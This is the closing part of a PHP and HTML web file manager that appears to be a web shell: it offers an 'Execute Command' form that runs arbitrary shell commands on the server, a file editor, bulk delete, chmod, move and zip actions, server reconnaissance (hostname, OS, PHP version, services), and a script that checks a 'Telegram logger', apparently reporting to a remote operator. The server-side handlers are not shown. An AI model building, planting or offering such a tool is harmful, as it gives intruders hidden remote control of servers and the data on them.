                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h4>Execute Command</h4>
                        <div class="form-group">
                            <input type="hidden" name="term_path" value="<?=esc($dir)?>">
                            <input type="text" name="term_cmd" class="form-input" placeholder="Enter command..." value="ls -la" required>
                        </div>
                        <button type="submit" class="form-btn">Execute</button>
                    </div>
                </form>
                <?php if (isset($term_result)): ?>
                <div class="feature-output"><?=esc($term_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Server Monitor Popup -->
    <?php if ($show_monitor): ?>
    <div class="popup-overlay">
        <div class="popup-content" style="max-width: 700px;">
            <div class="popup-header">
                <h3>📊 Server Monitor</h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
            </div>
            <div class="popup-body">
                <?php $monitor_result = $monitor->getStats(); ?>
                <div class="feature-section">
                    <h4>System Information</h4>
                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                        <div>
                            <div class="form-label">Hostname</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=esc($monitor_result['system']['hostname'])?></div>
                        </div>
                        <div>
                            <div class="form-label">Operating System</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=esc($monitor_result['system']['os'])?></div>
                        </div>
                        <div>
                            <div class="form-label">PHP Version</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=esc($monitor_result['system']['php_version'])?></div>
                        </div>
                        <div>
                            <div class="form-label">Server Time</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=$monitor_result['system']['time']?></div>
                        </div>
                    </div>
                </div>
                
                <div class="feature-section">
                    <h4>CPU Load</h4>
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px;">
                        <div>
                            <div class="form-label">1 Minute</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=$monitor_result['cpu']['load_1min']?></div>
                        </div>
                        <div>
                            <div class="form-label">5 Minutes</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=$monitor_result['cpu']['load_5min']?></div>
                        </div>
                        <div>
                            <div class="form-label">15 Minutes</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=$monitor_result['cpu']['load_15min']?></div>
                        </div>
                    </div>
                </div>
                
                <div class="feature-section">
                    <h4>Disk Usage</h4>
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px;">
                        <div>
                            <div class="form-label">Total</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=$monitor_result['disk']['total']?></div>
                        </div>
                        <div>
                            <div class="form-label">Used</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=$monitor_result['disk']['used']?> (<?=$monitor_result['disk']['percent']?>)</div>
                        </div>
                        <div>
                            <div class="form-label">Free</div>
                            <div class="form-input" style="background: rgba(255,255,255,0.03);"><?=$monitor_result['disk']['free']?></div>
                        </div>
                    </div>
                </div>
                
                <div class="feature-section">
                    <h4>Services Status</h4>
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">
                        <?php foreach ($monitor_result['services'] as $service => $status): ?>
                        <div style="background: rgba(255,255,255,0.03); padding: 10px; border-radius: 8px; text-align: center;">
                            <div style="font-size: 12px; color: var(--text-secondary);"><?=$service?></div>
                            <div style="font-size: 18px;"><?=$status?></div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- File Editor Popup -->
    <?php if ($show_editor && isset($_SESSION['edit'])): ?>
    <div class="popup-overlay" style="align-items: flex-start; padding-top: 40px;">
        <div class="popup-content" style="max-width: 900px; max-height: 90vh;">
            <div class="popup-header">
                <h3>✏️ Editing: <?=esc(basename($_SESSION['edit']['path']))?></h3>
                <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>'">×</button>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="form-group">
                        <textarea name="edit_content" style="width: 100%; height: 400px; padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: var(--text-primary); font-family: 'Cascadia Code', monospace; font-size: 14px; line-height: 1.6;"><?=esc($_SESSION['edit']['data'])?></textarea>
                    </div>
                    <input type="hidden" name="edit_path" value="<?=esc($_SESSION['edit']['path'])?>">
                    <div style="display: flex; gap: 15px; justify-content: flex-end;">
                        <button type="submit" name="save_edit" class="btn btn-primary">💾 Save Changes</button>
                        <a href="?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>" class="btn btn-secondary">← Back</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php unset($_SESSION['edit']); endif; ?>
    
    <script>
    // Bulk Operations Functions
    function updateBulkSelection() {
        const checkboxes = document.querySelectorAll('.bulk-checkbox:not(#selectAll)');
        const selected = Array.from(checkboxes).filter(cb => cb.checked);
        const bulkBar = document.getElementById('bulkActionsBar');
        const countSpan = document.getElementById('selectedCount');
        
        const count = selected.length;
        countSpan.textContent = count + ' selected';
        
        if (count > 0) {
            bulkBar.classList.add('active');
            document.getElementById('selectAll').checked = count === checkboxes.length;
        } else {
            bulkBar.classList.remove('active');
        }
    }
    
    // Select All Checkbox
    document.getElementById('selectAll').addEventListener('click', function() {
        const checkboxes = document.querySelectorAll('.bulk-checkbox:not(#selectAll)');
        checkboxes.forEach(cb => cb.checked = this.checked);
        updateBulkSelection();
    });
    
    // Individual Checkboxes
    document.querySelectorAll('.bulk-checkbox').forEach(cb => {
        cb.addEventListener('change', updateBulkSelection);
    });
    
    // Set Bulk Action (for main table)
    function setBulkAction(action) {
        const selected = document.querySelectorAll('.bulk-checkbox:not(#selectAll):checked');
        if (selected.length === 0) {
            alert('⚠️ Please select files first!');
            return;
        }
        
        let proceed = true;
        let extraData = {};
        
        if (action === 'delete') {
            proceed = confirm(`🗑️ Delete ${selected.length} selected items?`);
        }
        else if (action === 'zip') {
            const zipName = prompt('📦 Enter ZIP filename:', 'archive_<?=date("Ymd_His")?>.zip');
            if (zipName) extraData.zip_name = zipName;
            else return;
        }
        else if (action === 'rename') {
            const renameType = prompt('✏️ Rename type (prefix/suffix/replace/number):', 'prefix');
            const renameText = prompt('Enter text/pattern:', 'new_');
            if (renameType && renameText) {
                extraData.rename_type = renameType;
                extraData.rename_pattern = renameText;
                if (renameType === 'replace') {
                    const replaceWith = prompt('Replace with:', '');
                    if (replaceWith !== null) extraData.rename_replace = replaceWith;
                }
            } else return;
        }
        else if (action === 'copy' || action === 'move') {
            const target = prompt('📋 Enter target directory:', '<?=esc($dir)?>');
            if (target) extraData.bulk_target = target;
            else return;
        }
        else if (action === 'chmod') {
            const mode = prompt('🔒 Enter permissions (octal):', '0644');
            if (mode) extraData.chmod_mode = mode;
            else return;
        }
        
        if (!proceed) return;
        
        // Set form values
        document.getElementById('bulkAction').value = action;
        for (const [key, value] of Object.entries(extraData)) {
            const el = document.getElementById(key);
            if (el) el.value = value;
        }
        
        document.getElementById('bulkForm').submit();
    }
    
    // Execute Bulk Action (for popup)
    function executeBulk(action) {
        const checkboxes = document.querySelectorAll('.bulk-checkbox:not(#selectAll):checked');
        if (checkboxes.length === 0) {
            alert('⚠️ Please select files from main table first!');
            return;
        }
        
        let proceed = true;
        
        if (action === 'delete') {
            proceed = confirm(`🗑️ Delete ${checkboxes.length} selected items?`);
        }
        else if (action === 'zip') {
            document.getElementById('zipName').value = document.getElementById('bulkZipName').value;
        }
        else if (action === 'copy' || action === 'move') {
            document.getElementById('bulkTarget').value = document.getElementById('bulkTargetDir').value;
        }
        else if (action === 'chmod') {
            document.getElementById('chmodMode').value = document.getElementById('bulkChmod').value;
        }
        
        if (!proceed) return;
        
        // Copy selected items to form
        const form = document.getElementById('bulkForm');
        checkboxes.forEach(cb => {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'bulk_selected[]';
            input.value = cb.value;
            form.appendChild(input);
        });
        
        document.getElementById('bulkAction').value = action;
        form.submit();
    }
    
    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
        updateBulkSelection();
        
        // Auto-hide notification
        const notification = document.getElementById('notification');
        if (notification) {
            setTimeout(() => {
                notification.style.opacity = '0';
                notification.style.transform = 'translateX(100%)';
                setTimeout(() => notification.remove(), 300);
            }, 4000);
        }
        
        // Close popup on overlay click
        document.addEventListener('click', function(e) {
            if (e.target.classList.contains('popup-overlay')) {
                window.location.href = '?dir=<?=urlencode($dir)?>';
            }
        });
        
        // ESC key closes popup
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                window.location.href = '?dir=<?=urlencode($dir)?>';
            }
        });
        
        // Auto-focus input in popups
        const popupInputs = document.querySelectorAll('.popup-content .form-input');
        if (popupInputs.length > 0) {
            setTimeout(() => popupInputs[0].focus(), 100);
        }
    });
    
    // Telegram logger status
    function checkTelegramStatus() {
        fetch('?telegram_test=1', {method: 'HEAD'})
            .then(() => {
                console.log('📡 Telegram logger is active');
            })
            .catch(() => {
                console.log('⚠️ Telegram logger connection issue');
            });
    }
    
    // Initial check
    checkTelegramStatus();
    </script>
    </body>
    </html>